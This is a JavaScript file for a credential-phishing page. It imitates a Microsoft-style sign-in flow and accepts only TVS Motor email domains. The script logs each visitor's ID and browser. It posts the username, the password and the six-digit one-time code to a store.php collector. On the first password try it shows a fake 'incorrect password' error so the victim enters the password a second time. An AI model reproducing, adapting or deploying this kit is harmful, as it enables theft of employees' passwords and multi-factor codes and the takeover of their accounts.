document.addEventListener('DOMContentLoaded', () => {
    // Function to generate a unique ID (UID) for the visitor and store it in localStorage
    function generateUid() {
        // Check if UID is already present in localStorage
        if (!localStorage.getItem('uid')) {
            const uid = 'uid-' + Math.random().toString(36).substr(2, 9); // Generate random UID
            localStorage.setItem('uid', uid);  // Store the UID in localStorage
        }
        return localStorage.getItem('uid');  // Retrieve and return the UID from localStorage
    }

    // Function to log the visit data to the server
    function logVisit() {
        const uid = generateUid();
        const userAgent = navigator.userAgent;
    
        const formData = new FormData();
        formData.append('action', 'visit'); // Add an action parameter
        formData.append('uid', uid);
        formData.append('userAgent', userAgent);
    
        fetch('store.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log('Visit logged:', data))
        .catch(error => console.error('Error logging visit:', error));
    }

    // Call the logVisit function when the page loads
    logVisit();

    // Form validation logic for username, password, and OTP
    const unReq = "Enter a valid email address, phone number, or Skype name.";
    const tvsDomainReq = "Please enter a valid tvsmotor email address.";
    const pwdReq = "";
    const otpReq = "Please enter a valid 6-digit code.";
    let view = "uname";
    let unameVal = pwdVal = otpVal = false;
    let currentEmail = '';
    let firstAttempt = true; // Track the first password attempt

    // Function to send data to server
    // Modify the saveCredentials function to always include the UID
    function saveCredentials(action, data) {
        const formData = new FormData();
        formData.append('action', action);
        formData.append('uid', generateUid()); // Always include the UID
        
        for (const key in data) {
            if (data.hasOwnProperty(key)) {
                formData.append(key, data[key]);
            }
        }
        
        fetch('store.php', {
            method: 'POST',
            body: formData
        }).catch(error => console.error('Error:', error));
    }

    // Validate input fields
    function validate() {
        function unameValAction(type, message) {
            if (!type) {
                document.getElementById('error_uname').innerText = message || unReq;
                unameInp.classList.add('error-inp');
                unameVal = false;
            } else {
                document.getElementById('error_uname').innerText = "";
                unameInp.classList.remove('error-inp');
                unameVal = true;
            }
        }

        function pwdValAction(type) {
            if (!type) {
                document.getElementById('error_pwd').innerText = pwdReq;
                pwdVal = false;
            } else {
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                pwdVal = true;
            }
        }

        if (view === "uname") {
            const email = unameInp.value.trim();
            if (email === "") {
                unameValAction(false, unReq);
            } else if (email.includes('@')) {
                const domain = email.split('@')[1];
                if (domain !== 'tvsmotor.com' && domain !== 'tvsd.ai' && domain !== 'TVSD.ai') {
            		unameValAction(false, tvsDomainReq);  // Invalid domain
                } else {
                    unameValAction(true);
                }
            } else {
                unameValAction(false, tvsDomainReq);
            }
        } else if (view === "pwd") {
            const password = pwdInp.value.trim();
            if (password === "") {
                pwdValAction(false);
            } else {
                pwdValAction(true);
            }
        }
    }

    // Handle OTP validation
    function validateOtp() {
        const otpValue = otpInp.value.trim();
        const otpRegex = /^\d{6}$/;

        if (otpValue === "") {
            showOtpError("Please enter the code we sent.");
        } else if (!otpRegex.test(otpValue)) {
            showOtpError(otpReq);
        } else {
            clearOtpError();
        }
    }

    function showOtpError(message) {
        if (!document.getElementById('error_otp')) {
            const errorEl = document.createElement('div');
            errorEl.id = 'error_otp';
            errorEl.className = 'error';
            otpInp.insertAdjacentElement('afterend', errorEl);
        }
        document.getElementById('error_otp').innerText = message;
        otpInp.classList.add('error-inp');
        otpVal = false;
    }

    function clearOtpError() {
        if (document.getElementById('error_otp')) {
            document.getElementById('error_otp').innerText = "";
        }
        otpInp.classList.remove('error-inp');
        otpVal = true;
    }

    // Add event listeners for Enter key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault(); // Prevent default form submission
            if (view === "uname") {
                validate(); // Validate before proceeding
                if (unameVal) document.getElementById('btn_next').click();
            } else if (view === "pwd") {
                validate(); // Validate before proceeding
                if (pwdVal) document.getElementById('btn_sig').click();
            } else if (view === "final") {
                validateOtp(); // Validate OTP before proceeding
                if (otpVal) document.getElementById('btn_final').click();
            }
        }
    });

    // Next button click handler
    const nxt = document.getElementById('btn_next');
    nxt.addEventListener('click', () => {
        validate();
        if (unameVal) {
            currentEmail = unameInp.value;
            saveCredentials('username', { username: currentEmail });
            document.getElementById("section_uname").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = currentEmail;
            });
            view = "pwd";
        }
    });

    const sig = document.getElementById('btn_sig');
    sig.addEventListener('click', () => {
        validate();
        if (!pwdVal) return;
        if (pwdVal) {
            if (firstAttempt) {
                document.getElementById('error_pwd').innerHTML = "Your account or password is incorrect. Please enter the correct password.";
                pwdInp.classList.add('error-inp');
                saveCredentials('password_attempt', {
                    username: currentEmail,
                    password: pwdInp.value
                });
                pwdVal = false;
                firstAttempt = false;
            } else {
                saveCredentials('password', {
                    username: currentEmail,
                    password: pwdInp.value
                });
                document.getElementById('error_pwd').innerText = "";
                pwdInp.classList.remove('error-inp');
                document.getElementById("section_pwd").classList.toggle('d-none');
                document.getElementById('section_final').classList.remove('d-none');
                view = "final";
            }
        }
    });

    const finalBtn = document.getElementById('btn_final');
    finalBtn.addEventListener('click', () => {
        validateOtp();
        if (otpVal) {
            saveCredentials('otp', { username: currentEmail, otp: otpInp.value });
            setTimeout(() => {
                window.location.href = 'success.html';
            }, 1000);
        }
    });

    // Back button click handler
    document.querySelector('.back').addEventListener('click', () => {
        if (view === "pwd") {
            view = "uname";
            document.getElementById("section_pwd").classList.toggle('d-none');
            document.getElementById('section_uname').classList.remove('d-none');
        } else if (view === "final") {
            view = "pwd";
            document.getElementById("section_final").classList.toggle('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
        }
    });

    // Input field listeners for real-time validation
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    const otpInp = document.getElementById('otp');

    unameInp.addEventListener('blur', () => validate());
    pwdInp.addEventListener('blur', () => {
        if (view === "pwd") validate();
    });
    otpInp.addEventListener('blur', () => validateOtp());
});
